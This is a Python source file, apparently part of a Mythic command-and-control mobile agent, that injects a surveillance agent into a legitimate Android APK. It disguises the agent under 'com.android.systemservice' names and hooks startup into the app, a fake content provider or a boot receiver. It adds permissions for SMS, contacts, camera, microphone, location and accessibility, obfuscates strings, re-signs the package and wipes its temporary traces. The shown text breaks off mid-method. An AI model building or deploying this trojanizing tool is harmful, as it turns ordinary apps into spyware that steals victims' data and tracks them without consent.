
"""
inject_payload.py - Enhanced APK Injection for Mythic Mobile Agent
Maintains all original permissions with advanced stealth injection capabilities
"""

import os
import sys
import shutil
import zipfile
import subprocess
import tempfile
import json
import hashlib
import time
import re
import random
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Set
import xml.etree.ElementTree as ET

class EnhancedAPKInjector:
    def __init__(self, build_params: Dict):
        self.build_params = build_params
        self.target_android_version = int(build_params.get("target_android_version", "34"))
        self.temp_dir = None
        self.stealth_mode = build_params.get("stealth_injection", True)
        self.preserve_signature = build_params.get("preserve_original_signature", True)
        

        self.android_home = os.environ.get('ANDROID_HOME', '/opt/android-sdk')
        self.build_tools = f"{self.android_home}/build-tools/34.0.0"
        self.namespace = "{http://schemas.android.com/apk/res/android}"
        

        self.required_permissions = [
            "android.permission.INTERNET",
            "android.permission.ACCESS_NETWORK_STATE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.RECORD_AUDIO",
            "android.permission.CAMERA",
            "android.permission.READ_PHONE_STATE",
            "android.permission.READ_SMS",
            "android.permission.RECEIVE_SMS",
            "android.permission.READ_CONTACTS",
            "android.permission.SYSTEM_ALERT_WINDOW",
            "android.permission.BIND_ACCESSIBILITY_SERVICE",
            "android.permission.FOREGROUND_SERVICE"
        ]
        

        if self.target_android_version >= 34:
            self.required_permissions.extend([
                "android.permission.POST_NOTIFICATIONS",
                "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
                "android.permission.FOREGROUND_SERVICE_CAMERA",
                "android.permission.FOREGROUND_SERVICE_MICROPHONE",
                "android.permission.FOREGROUND_SERVICE_LOCATION",
                "android.permission.USE_FULL_SCREEN_INTENT",
                "android.permission.SCHEDULE_EXACT_ALARM"
            ])

    def inject_into_apk(self, target_apk_path: str, agent_payload_path: str,
                       original_keystore: Optional[str] = None) -> str:
        """Enhanced APK injection with all original permissions maintained"""
        try:
            print(f"[+] Starting enhanced APK injection...")
            print(f"[+] Target APK: {target_apk_path}")
            print(f"[+] Agent payload: {agent_payload_path}")
            print(f"[+] Android Target: API {self.target_android_version}")
            
            self._setup_enhanced_workspace(target_apk_path, agent_payload_path)
            

            self._analyze_target_apk()
            

            self._enhanced_decompile()
            

            self._stealth_inject_agent()
            

            self._modify_manifest_with_all_permissions()
            

            self._add_enhanced_agent_resources()
            

            if self.build_params.get("obfuscation_level", "none") != "none":
                self._apply_stealth_obfuscation()
            

            output_path = self._enhanced_recompile_and_sign(original_keystore)
            

            self._verify_injection_with_permissions(output_path)
            
            print(f"[+] Enhanced injection completed: {output_path}")
            return output_path
            
        except Exception as e:
            print(f"[-] Enhanced injection failed: {str(e)}")
            raise
        finally:
            self._secure_cleanup()

    def _setup_enhanced_workspace(self, target_apk: str, agent_payload: str):
        """Setup enhanced workspace with security measures"""
        self.temp_dir = tempfile.mkdtemp(prefix="mythic_inject_", dir="/tmp")
        os.chmod(self.temp_dir, 0o700)
        
        self.original_apk = target_apk
        self.agent_dex = agent_payload
        

        self.decompiled_dir = os.path.join(self.temp_dir, "target")
        self.agent_dir = os.path.join(self.temp_dir, "agent")
        self.output_dir = os.path.join(self.temp_dir, "output")
        self.backup_dir = os.path.join(self.temp_dir, "backup")
        
        for dir_path in [self.decompiled_dir, self.agent_dir, self.output_dir, self.backup_dir]:
            os.makedirs(dir_path, exist_ok=True)
            os.chmod(dir_path, 0o700)

    def _analyze_target_apk(self):
        """Analyze target APK for optimal injection strategy"""
        print("[+] Analyzing target APK...")
        
        try:
            cmd = [f"{self.build_tools}/aapt2", "dump", "badging", self.original_apk]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if "targetSdkVersion:" in line:
                        target_sdk = line.split("'")[1]
                        print(f"[+] Target APK SDK: {target_sdk}")
                        
        except Exception as e:
            print(f"[!] APK analysis warning: {e}")

    def _enhanced_decompile(self):
        """Enhanced decompilation with backup and error handling"""
        print("[+] Enhanced decompilation...")
        

        backup_path = os.path.join(self.backup_dir, "original.apk")
        shutil.copy2(self.original_apk, backup_path)
        

        cmd = [
            "apktool", "d",
            self.original_apk,
            "-o", self.decompiled_dir,
            "-f",
            "--no-debug-info",
            "--keep-broken-res"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Enhanced decompilation failed: {result.stderr}")
        
        print("[+] Decompilation completed successfully")

    def _stealth_inject_agent(self):
        """Stealth agent injection with advanced techniques"""
        print("[+] Performing stealth agent injection...")
        

        agent_smali_dir = os.path.join(self.agent_dir, "smali")
        cmd = [
            "baksmali", "d",
            self.agent_dex,
            "-o", agent_smali_dir,
            "--api", str(self.target_android_version)
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Agent disassembly failed: {result.stderr}")
        

        target_smali_dirs = self._find_optimal_smali_dirs()
        

        self._inject_with_stealth_techniques(agent_smali_dir, target_smali_dirs)
        

        self._enhanced_bootstrap_injection()

    def _find_optimal_smali_dirs(self) -> List[str]:
        """Find optimal smali directories for injection"""
        smali_dirs = []
        
        for item in os.listdir(self.decompiled_dir):
            if item.startswith("smali"):
                smali_dirs.append(os.path.join(self.decompiled_dir, item))
        
        if not smali_dirs:
            default_smali = os.path.join(self.decompiled_dir, "smali")
            os.makedirs(default_smali, exist_ok=True)
            smali_dirs.append(default_smali)
        
        return smali_dirs

    def _inject_with_stealth_techniques(self, agent_smali_dir: str, target_dirs: List[str]):
        """Inject agent code using stealth distribution"""
        target_dir_index = 0
        
        for root, dirs, files in os.walk(agent_smali_dir):
            for file in files:
                if file.endswith('.smali'):
                    src_path = os.path.join(root, file)
                    rel_path = os.path.relpath(src_path, agent_smali_dir)
                    

                    target_dir = target_dirs[target_dir_index % len(target_dirs)]
                    dst_path = os.path.join(target_dir, rel_path)
                    
                    os.makedirs(os.path.dirname(dst_path), exist_ok=True)
                    

                    self._copy_with_stealth_modifications(src_path, dst_path)
                    
                    target_dir_index += 1

    def _copy_with_stealth_modifications(self, src: str, dst: str):
        """Copy smali file with stealth modifications"""
        with open(src, 'r') as f:
            content = f.read()
        
        if self.stealth_mode:

            content = self._add_dummy_instructions(content)
        
        with open(dst, 'w') as f:
            f.write(content)

    def _add_dummy_instructions(self, content: str) -> str:
        """Add harmless dummy instructions"""
        dummy_instructions = [
            "    nop",
            "    const/4 v0, 0x0",
            "    const/4 v1, 0x1"
        ]
        
        lines = content.split('\n')
        result_lines = []
        
        for line in lines:
            result_lines.append(line)
            if '.method' in line and 'static' in line:
                if hash(line) % 3 == 0:
                    result_lines.append(dummy_instructions[hash(line) % len(dummy_instructions)])
        
        return '\n'.join(result_lines)

    def _enhanced_bootstrap_injection(self):
        """Enhanced bootstrap injection with multiple fallback methods"""
        print("[+] Injecting enhanced bootstrap...")
        
        injection_success = False
        

        if self._inject_into_application_class():
            injection_success = True
            print("[+] Bootstrap injected into application class")
        

        elif self._inject_into_main_activity():
            injection_success = True
            print("[+] Bootstrap injected into main activity")
        

        elif self._inject_into_content_provider():
            injection_success = True
            print("[+] Bootstrap injected into content provider")
        
        if not injection_success:
            print("[!] Warning: Bootstrap injection failed, using alternative startup")

    def _inject_into_application_class(self) -> bool:
        """Inject into application class if available"""
        try:
            manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            
            app_elem = root.find(".//application[@{http://schemas.android.com/apk/res/android}name]")
            if app_elem is not None:
                app_class = app_elem.get("{http://schemas.android.com/apk/res/android}name")
                return self._modify_class_for_bootstrap(app_class, "Application")
        except Exception as e:
            print(f"[!] Application class injection failed: {e}")
        
        return False

    def _inject_into_main_activity(self) -> bool:
        """Inject into main activity as fallback"""
        try:
            manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            
            activities = root.findall(".//activity")
            for activity in activities:
                intent_filters = activity.findall("intent-filter")
                for intent_filter in intent_filters:
                    actions = intent_filter.findall("action")
                    categories = intent_filter.findall("category")
                    
                    has_main = any(action.get("{http://schemas.android.com/apk/res/android}name") == "android.intent.action.MAIN" for action in actions)
                    has_launcher = any(cat.get("{http://schemas.android.com/apk/res/android}name") == "android.intent.category.LAUNCHER" for cat in categories)
                    
                    if has_main and has_launcher:
                        activity_name = activity.get("{http://schemas.android.com/apk/res/android}name")
                        if activity_name:
                            return self._modify_class_for_bootstrap(activity_name, "Activity")
        except Exception as e:
            print(f"[!] Main activity injection failed: {e}")
        
        return False

    def _inject_into_content_provider(self) -> bool:
        """Inject into content provider for stealth startup"""
        try:

            provider_class = "com.android.systemservice.StealthProvider"
            

            manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            
            application = root.find("application")
            if application is not None:
                provider = ET.SubElement(application, "provider")
                provider.set("{http://schemas.android.com/apk/res/android}name", provider_class)
                provider.set("{http://schemas.android.com/apk/res/android}authorities", "com.android.systemservice.provider")
                provider.set("{http://schemas.android.com/apk/res/android}enabled", "true")
                provider.set("{http://schemas.android.com/apk/res/android}exported", "false")
                
                tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
                

                return self._create_stealth_provider(provider_class)
        except Exception as e:
            print(f"[!] Content provider injection failed: {e}")
        
        return False

    def _modify_class_for_bootstrap(self, class_name: str, class_type: str) -> bool:
        """Modify specific class for bootstrap injection"""
        try:
            class_path = class_name.replace('.', '/') + '.smali'
            

            smali_dirs = self._find_optimal_smali_dirs()
            
            for smali_dir in smali_dirs:
                smali_file = os.path.join(smali_dir, class_path)
                if os.path.exists(smali_file):
                    with open(smali_file, 'r') as f:
                        content = f.read()
                    

                    bootstrap_code = '''
    # Mythic Agent Bootstrap
    invoke-static {}, Lcom/android/systemservice/MythicAgent;->initialize()V
    '''
                    

                    if class_type == "Application":
                        target = 'invoke-super {p0}, Landroid/app/Application;->onCreate()V'
                    else:
                        target = 'invoke-super {p0}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V'
                    
                    if target in content:
                        modified_content = content.replace(target, target + bootstrap_code)
                        
                        with open(smali_file, 'w') as f:
                            f.write(modified_content)
                        
                        return True
        except Exception as e:
            print(f"[!] Class modification failed: {e}")
        
        return False

    def _create_stealth_provider(self, provider_class: str) -> bool:
        """Create stealth content provider for bootstrap"""
        try:
            provider_smali = f'''
.class public L{provider_class.replace(".", "/")};
.super Landroid/content/ContentProvider;

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Landroid/content/ContentProvider;-><init>()V
    # Initialize agent on provider creation
    invoke-static {{}}, Lcom/android/systemservice/MythicAgent;->initialize()V
    return-void
.end method

.method public onCreate()Z
    .locals 1
    const/4 v0, 0x1
    return v0
.end method

.method public query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public getType(Landroid/net/Uri;)Ljava/lang/String;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    .locals 1
    const/4 v0, 0x0
    return v0
.end method

.method public update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I
    .locals 1
    const/4 v0, 0x0
    return v0
.end method
'''
            

            smali_dirs = self._find_optimal_smali_dirs()
            provider_path = os.path.join(smali_dirs[0], provider_class.replace(".", "/") + ".smali")
            
            os.makedirs(os.path.dirname(provider_path), exist_ok=True)
            
            with open(provider_path, 'w') as f:
                f.write(provider_smali)
            
            return True
            
        except Exception as e:
            print(f"[!] Stealth provider creation failed: {e}")
            return False

    def _modify_manifest_with_all_permissions(self):
        """Modify manifest with ALL original permissions maintained"""
        print("[+] Modifying manifest with all required permissions...")
        
        manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
        
        try:
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            

            existing_permissions = set()
            for perm in root.findall("uses-permission"):
                name = perm.get("{http://schemas.android.com/apk/res/android}name")
                if name:
                    existing_permissions.add(name)
            

            permissions_added = 0
            for permission in self.required_permissions:
                if permission not in existing_permissions:
                    perm_elem = ET.SubElement(root, "uses-permission")
                    perm_elem.set("{http://schemas.android.com/apk/res/android}name", permission)
                    permissions_added += 1
                    print(f"[+] Added permission: {permission}")
            
            print(f"[+] Total permissions added: {permissions_added}")
            print(f"[+] Total permissions in manifest: {len(existing_permissions) + permissions_added}")
            

            application = root.find("application")
            if application is not None:

                service_elem = ET.SubElement(application, "service")
                service_elem.set("{http://schemas.android.com/apk/res/android}name", "com.android.systemservice.MythicAgentService")
                service_elem.set("{http://schemas.android.com/apk/res/android}enabled", "true")
                service_elem.set("{http://schemas.android.com/apk/res/android}exported", "false")
                service_elem.set("{http://schemas.android.com/apk/res/android}stopWithTask", "false")
                

                if self.target_android_version >= 29:
                    service_elem.set("{http://schemas.android.com/apk/res/android}foregroundServiceType", "dataSync")
                

                receiver_elem = ET.SubElement(application, "receiver")
                receiver_elem.set("{http://schemas.android.com/apk/res/android}name", "com.android.systemservice.EnhancedBootReceiver")
                receiver_elem.set("{http://schemas.android.com/apk/res/android}enabled", "true")
                receiver_elem.set("{http://schemas.android.com/apk/res/android}exported", "true")
                
                intent_filter = ET.SubElement(receiver_elem, "intent-filter")
                intent_filter.set("{http://schemas.android.com/apk/res/android}priority", "1000")
                
                boot_actions = [
                    "android.intent.action.BOOT_COMPLETED",
                    "android.intent.action.QUICKBOOT_POWERON",
                    "android.intent.action.MY_PACKAGE_REPLACED",
                    "android.intent.action.USER_PRESENT"
                ]
                
                for action in boot_actions:
                    action_elem = ET.SubElement(intent_filter, "action")
                    action_elem.set("{http://schemas.android.com/apk/res/android}name", action)
                

                if "android.permission.SYSTEM_ALERT_WINDOW" in self.required_permissions:
                    acc_service = ET.SubElement(application, "service")
                    acc_service.set("{http://schemas.android.com/apk/res/android}name", "com.android.systemservice.AccessibilityService")
                    acc_service.set("{http://schemas.android.com/apk/res/android}enabled", "true")
                    acc_service.set("{http://schemas.android.com/apk/res/android}exported", "false")
                    acc_service.set("{http://schemas.android.com/apk/res/android}permission", "android.permission.BIND_ACCESSIBILITY_SERVICE")
                    
                    acc_filter = ET.SubElement(acc_service, "intent-filter")
                    acc_action = ET.SubElement(acc_filter, "action")
                    acc_action.set("{http://schemas.android.com/apk/res/android}name", "android.accessibilityservice.AccessibilityService")
            

            tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
            print("[+] Manifest modification completed with all permissions")
            
        except Exception as e:
            print(f"[!] Manifest modification error: {str(e)}")
            raise

    def _add_enhanced_agent_resources(self):
        """Add enhanced agent resources and configuration"""
        print("[+] Adding enhanced agent resources...")
        

        assets_dir = os.path.join(self.decompiled_dir, "assets")
        os.makedirs(assets_dir, exist_ok=True)
        

        agent_config = {
            "campaign_id": self.build_params.get("campaign_id", "default_campaign"),
            "device_id": hashlib.md5(f"{time.time()}".encode()).hexdigest()[:16],
            "c2_profile": self.build_params.get("c2_profile", "https_beacon"),
            "encryption_algorithm": self.build_params.get("encryption_algorithm", "AES-256-GCM"),
            "target_android_version": self.target_android_version,
            "offline_logging": self.build_params.get("enable_offline_logging", True),
            "logging_interval": self.build_params.get("logging_interval", 10),
            "stealth_mode": self.stealth_mode,
            "modules": {
                "overlay": self.build_params.get("enable_overlay", True),
                "frida": self.build_params.get("enable_frida", True),
                "stealth_surveillance": self.build_params.get("enable_stealth_surveillance", True),
                "call_logger": True,
                "filesystem": True,
                "notification_listener": True
            },
            "permissions": self.required_permissions,
            "build_timestamp": int(time.time())
        }
        

        config_path = os.path.join(assets_dir, "agent.json")
        with open(config_path, 'w') as f:
            json.dump(agent_config, f, indent=2)
        
        print("[+] Enhanced agent resources added successfully")

    def _apply_stealth_obfuscation(self):
        """Apply stealth obfuscation to injected code"""
        print("[+] Applying stealth obfuscation...")
        
        smali_dirs = self._find_optimal_smali_dirs()
        
        for smali_dir in smali_dirs:
            for root, dirs, files in os.walk(smali_dir):
                for file in files:
                    if file.endswith('.smali') and 'mythic' in file.lower():
                        file_path = os.path.join(root, file)
                        self._obfuscate_smali_file(file_path)
        
        print("[+] Stealth obfuscation applied")

    def _obfuscate_smali_file(self, file_path: str):
        """Apply obfuscation to individual smali file"""
        try:
            with open(file_path, 'r') as f:
                content = f.read()
            

            content = re.sub(r'const-string [vp]\d+, "(.*?)"', self._obfuscate_string, content)
            
            with open(file_path, 'w') as f:
                f.write(content)
                
        except Exception as e:
            print(f"[!] Obfuscation warning for {file_path}: {e}")

    def _obfuscate_string(self, match):
        """Obfuscate string literals"""
        original = match.group(1)
        if len(original) < 3:
            return match.group(0)
        

        key = 0x42
        obfuscated = ''.join(chr(ord(c) ^ key) for c in original)
        encoded = ''.join(f'\\u{ord(c):04x}' for c in obfuscated)
        
        return f'const-string v0, "{encoded}"\n    invoke-static {{v0}}, Lcom/android/systemservice/StringDecryptor;->decrypt(Ljava/lang/String;)Ljava/lang/String;\n    move-result-object v0'

    def _enhanced_recompile_and_sign(self, original_keystore: Optional[str] = None) -> str:
        """Enhanced recompilation and signing"""
        print("[+] Enhanced recompilation and signing...")
        

        unsigned_apk = os.path.join(self.output_dir, "unsigned.apk")
        
        cmd = [
            "apktool", "b",
            self.decompiled_dir,
            "-o", unsigned_apk,
            "--use-aapt2",
            "--api", str(self.target_android_version)
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Enhanced recompilation failed: {result.stderr}")
        

        signed_apk = self._sign_apk(unsigned_apk, original_keystore)
        

        final_apk = self._zipalign_apk(signed_apk)
        
        return final_apk

    def _sign_apk(self, unsigned_apk: str, original_keystore: Optional[str] = None) -> str:
        """Sign APK with enhanced certificate handling"""
        print("[+] Signing APK...")
        
        signed_apk = os.path.join(self.output_dir, "signed.apk")
        

        if original_keystore and os.path.exists(original_keystore):
            print("[+] Using provided keystore")
            keystore_path = original_keystore
            storepass = "android"
            keypass = "android"
            alias = "androiddebugkey"
        else:

            keystore_path = os.path.expanduser("~/.android/debug.keystore")
            if not os.path.exists(keystore_path):
                self._generate_debug_keystore(keystore_path)
            storepass = "android"
            keypass = "android"
            alias = "androiddebugkey"
        
        cmd = [
            "jarsigner", "-verbose",
            "-sigalg", "SHA1withRSA",
            "-digestalg", "SHA1",
            "-keystore", keystore_path,
            "-storepass", storepass,
            "-keypass", keypass,
            "-signedjar", signed_apk,
            unsigned_apk,
            alias
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"APK signing failed: {result.stderr}")
        
        return signed_apk

    def _generate_debug_keystore(self, keystore_path: str):
        """Generate debug keystore for signing"""
        os.makedirs(os.path.dirname(keystore_path), exist_ok=True)
        
        cmd = [
            "keytool", "-genkey", "-v",
            "-keystore", keystore_path,
            "-alias", "androiddebugkey",
            "-keyalg", "RSA",
            "-keysize", "2048",
            "-validity", "10000",
            "-storepass", "android",
            "-keypass", "android",
            "-dname", "CN=Android Debug,O=Android,C=US"
        ]
        
        subprocess.run(cmd, capture_output=True, text=True)

    def _zipalign_apk(self, signed_apk: str) -> str:
        """Optimize APK with zipalign"""
        print("[+] Optimizing APK with zipalign...")
        
        campaign_id = self.build_params.get("campaign_id", "default")
        timestamp = int(time.time())
        final_apk = os.path.join(self.output_dir, f"injected_{campaign_id}_{timestamp}.apk")
        
        cmd = ["zipalign", "-v", "4", signed_apk, final_apk]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"[!] Zipalign warning: {result.stderr}")
            shutil.copy2(signed_apk, final_apk)
        
        return final_apk

    def _verify_injection_with_permissions(self, final_apk: str):
        """Verify injection integrity and all permissions are present"""
        print("[+] Verifying injection integrity and permissions...")
        

        cmd = [f"{self.build_tools}/aapt2", "dump", "badging", final_apk]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            raise Exception("Injection verification failed - APK appears corrupted")
        

        cmd = [f"{self.build_tools}/aapt2", "dump", "permissions", final_apk]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            final_permissions = set()
            for line in result.stdout.split('\n'):
                if 'uses-permission:' in line:
                    perm = line.split("'")[1] if "'" in line else ""
                    if perm:
                        final_permissions.add(perm)
            

            missing_permissions = set(self.required_permissions) - final_permissions
            if missing_permissions:
                print(f"[!] Warning: Missing permissions: {missing_permissions}")
            else:
                print(f"[+] All {len(self.required_permissions)} required permissions verified")
        

        with zipfile.ZipFile(final_apk, 'r') as zip_file:
            files = zip_file.namelist()
            agent_files = [f for f in files if any(keyword in f.lower() for keyword in ['mythic', 'agent', 'systemservice'])]
            
            if agent_files:
                print(f"[+] Found {len(agent_files)} agent-related files")
            else:
                print("[!] Warning: No agent files detected")

    def _secure_cleanup(self):
        """Secure cleanup of temporary files"""
        if self.temp_dir and os.path.exists(self.temp_dir):
            try:

                for root, dirs, files in os.walk(self.temp_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            file_size = os.path.getsize(file_path)
                            with open(file_path, 'wb') as f:
                                f.write(os.urandom(file_size))
                        except:
                            pass
                
                shutil.rmtree(self.temp_dir)
                print("[+] Secure cleanup completed")
            except Exception as e:
                print(f"[!] Secure cleanup warning: {e}")

def main():
    """Enhanced main entry point"""
    if len(sys.argv) < 3:
        print("Usage: python inject_payload.py <target_apk> <agent_dex> [build_params.json] [original_keystore]")
        sys.exit(1)
    
    target_apk = sys.argv[1]
    agent_dex = sys.argv[2]
    

    build_params = {}
    if len(sys.argv) > 3:
        try:
            with open(sys.argv[3], 'r') as f:
                build_params = json.load(f)
        except:
            print("[!] Warning: Could not load build parameters, using defaults")
    

    original_keystore = sys.argv[4] if len(sys.argv) > 4 else None
    

    injector = EnhancedAPKInjector(build_params)
    
    try:
        output_apk = injector.inject_into_apk(target_apk, agent_dex, original_keystore)
        
        result = {
            "status": "success",
            "output_file": output_apk,
            "message": "Enhanced APK injection completed successfully with all permissions",
            "permissions_count": len(injector.required_permissions),
            "file_hash": hashlib.sha256(open(output_apk, 'rb').read()).hexdigest(),
            "build_timestamp": int(time.time())
        }
        
        print(f"MYTHIC_RESULT: {json.dumps(result)}")
        
    except Exception as e:
        result = {
            "status": "error",
            "message": str(e),
            "permissions_attempted": len(injector.required_permissions)
        }
        
        print(f"MYTHIC_RESULT: {json.dumps(result)}")
        sys.exit(1)


class EnhancedAPKInjectorMethods(EnhancedAPKInjector):
    def implement_dex_merging_with_class_renaming(self, target_dex: str, agent_dex: str) -> str:
        """Advanced DEX merging with class renaming to avoid conflicts"""
        print("[+] Implementing DEX merging with class renaming...")
        
        try:

            dex_work_dir = os.path.join(self.temp_dir, "dex_merge")
            os.makedirs(dex_work_dir, exist_ok=True)
            

            target_smali_dir = os.path.join(dex_work_dir, "target_smali")
            agent_smali_dir = os.path.join(dex_work_dir, "agent_smali")
            
            self._disassemble_dex(target_dex, target_smali_dir)
            self._disassemble_dex(agent_dex, agent_smali_dir)
            

            conflict_map = self._analyze_class_conflicts(target_smali_dir, agent_smali_dir)
            

            self._rename_conflicting_classes(agent_smali_dir, conflict_map)
            

            merged_smali_dir = os.path.join(dex_work_dir, "merged_smali")
            self._merge_smali_directories(target_smali_dir, agent_smali_dir, merged_smali_dir)
            

            merged_dex = os.path.join(dex_work_dir, "merged.dex")
            self._reassemble_dex(merged_smali_dir, merged_dex)
            
            print("[+] DEX merging completed successfully")
            return merged_dex
            
        except Exception as e:
            print(f"[!] DEX merging failed: {e}")
            raise
    
    def _disassemble_dex(self, dex_path: str, output_dir: str) -> None:
        """Disassemble DEX file to Smali"""
        cmd = [
            "baksmali", "d",
            dex_path,
            "-o", output_dir,
            "--api", str(self.target_android_version)
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"DEX disassembly failed: {result.stderr}")
    
    def _reassemble_dex(self, smali_dir: str, output_dex: str) -> None:
        """Reassemble Smali to DEX"""
        cmd = [
            "smali", "a",
            smali_dir,
            "-o", output_dex,
            "--api", str(self.target_android_version)
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"DEX reassembly failed: {result.stderr}")
    
    def _analyze_class_conflicts(self, target_dir: str, agent_dir: str) -> Dict[str, str]:
        """Analyze class conflicts and generate rename mapping"""
        print("[+] Analyzing class conflicts...")
        
        target_classes = self._collect_class_names(target_dir)
        agent_classes = self._collect_class_names(agent_dir)
        
        conflicts = target_classes.intersection(agent_classes)
        
        conflict_map = {}
        for conflict_class in conflicts:

            new_name = f"injected/{conflict_class.replace('/', '_')}_{random.randint(1000, 9999)}"
            conflict_map[conflict_class] = new_name
            print(f"[+] Conflict resolved: {conflict_class} -> {new_name}")
        
        return conflict_map
    
    def _collect_class_names(self, smali_dir: str) -> Set[str]:
        """Collect all class names from smali directory"""
        class_names = set()
        
        for root, dirs, files in os.walk(smali_dir):
            for file in files:
                if file.endswith('.smali'):
                    file_path = os.path.join(root, file)
                    with open(file_path, 'r') as f:
                        content = f.read()
                    

                    class_match = re.search(r'\.class.*?L([^;]+);', content)
                    if class_match:
                        class_names.add(class_match.group(1))
        
        return class_names
    
    def _rename_conflicting_classes(self, agent_dir: str, conflict_map: Dict[str, str]) -> None:
        """Rename conflicting classes in agent directory"""
        print("[+] Renaming conflicting classes...")
        
        for root, dirs, files in os.walk(agent_dir):
            for file in files:
                if file.endswith('.smali'):
                    file_path = os.path.join(root, file)
                    
                    with open(file_path, 'r') as f:
                        content = f.read()
                    

                    modified = False
                    for old_class, new_class in conflict_map.items():
                        old_ref = f"L{old_class};"
                        new_ref = f"L{new_class};"
                        
                        if old_ref in content:
                            content = content.replace(old_ref, new_ref)
                            modified = True
                    
                    if modified:
                        with open(file_path, 'w') as f:
                            f.write(content)
        

        for old_class, new_class in conflict_map.items():
            old_file = os.path.join(agent_dir, f"{old_class.replace('/', os.sep)}.smali")
            new_file = os.path.join(agent_dir, f"{new_class.replace('/', os.sep)}.smali")
            
            if os.path.exists(old_file):

                os.makedirs(os.path.dirname(new_file), exist_ok=True)
                shutil.move(old_file, new_file)
    
    def _merge_smali_directories(self, target_dir: str, agent_dir: str, output_dir: str) -> None:
        """Merge smali directories"""
        print("[+] Merging smali directories...")
        

        shutil.copytree(target_dir, output_dir, dirs_exist_ok=True)
        

        for root, dirs, files in os.walk(agent_dir):
            for file in files:
                if file.endswith('.smali'):
                    src_path = os.path.join(root, file)
                    rel_path = os.path.relpath(src_path, agent_dir)
                    dst_path = os.path.join(output_dir, rel_path)
                    

                    os.makedirs(os.path.dirname(dst_path), exist_ok=True)
                    shutil.copy2(src_path, dst_path)
    
    def implement_resource_conflict_resolution(self) -> None:
        """Implement resource conflict resolution"""
        print("[+] Implementing resource conflict resolution...")
        
        try:

            conflicts = self._analyze_resource_conflicts()
            

            for conflict in conflicts:
                self._resolve_resource_conflict(conflict)
            
            print(f"[+] Resolved {len(conflicts)} resource conflicts")
            
        except Exception as e:
            print(f"[!] Resource conflict resolution failed: {e}")
    
    def _analyze_resource_conflicts(self) -> List[Dict]:
        """Analyze resource conflicts between target and agent"""
        conflicts = []
        
        target_res_dir = os.path.join(self.decompiled_dir, "res")
        agent_res_dir = os.path.join(self.agent_dir, "res")
        
        if not os.path.exists(agent_res_dir):
            return conflicts
        

        for root, dirs, files in os.walk(agent_res_dir):
            for file in files:
                agent_res_path = os.path.join(root, file)
                rel_path = os.path.relpath(agent_res_path, agent_res_dir)
                target_res_path = os.path.join(target_res_dir, rel_path)
                
                if os.path.exists(target_res_path):
                    conflicts.append({
                        'type': 'file',
                        'target': target_res_path,
                        'agent': agent_res_path,
                        'relative': rel_path
                    })
        
        return conflicts
    
    def _resolve_resource_conflict(self, conflict: Dict) -> None:
        """Resolve individual resource conflict"""
        if conflict['type'] == 'file':

            agent_path = conflict['agent']
            target_path = conflict['target']
            rel_path = conflict['relative']
            

            dir_path, file_name = os.path.split(rel_path)
            name, ext = os.path.splitext(file_name)
            new_name = f"agent_{name}{ext}"
            new_rel_path = os.path.join(dir_path, new_name)
            

            new_target_path = os.path.join(os.path.dirname(target_path), new_name)
            shutil.copy2(agent_path, new_target_path)
            
            print(f"[+] Resource conflict resolved: {rel_path} -> {new_rel_path}")
    
    def create_verification_suite(self, injected_apk: str) -> Dict[str, bool]:
        """Create comprehensive verification suite for injection integrity"""
        print("[+] Running injection integrity verification suite...")
        
        results = {}
        

        results['apk_structure'] = self._verify_apk_structure(injected_apk)
        

        results['manifest_integrity'] = self._verify_manifest_integrity()
        

        results['dex_integrity'] = self._verify_dex_integrity(injected_apk)
        

        results['signature_valid'] = self._verify_signature(injected_apk)
        

        results['agent_components'] = self._verify_agent_components(injected_apk)
        

        results['permissions_complete'] = self._verify_permissions_complete(injected_apk)
        

        results['resource_integrity'] = self._verify_resource_integrity(injected_apk)
        

        results['anti_analysis'] = self._verify_anti_analysis_features(injected_apk)
        

        passed_tests = sum(1 for result in results.values() if result)
        total_tests = len(results)
        
        print(f"[+] Verification complete: {passed_tests}/{total_tests} tests passed")
        
        return results
    
    def _verify_apk_structure(self, apk_path: str) -> bool:
        """Verify APK structure integrity"""
        try:
            with zipfile.ZipFile(apk_path, 'r') as apk_zip:
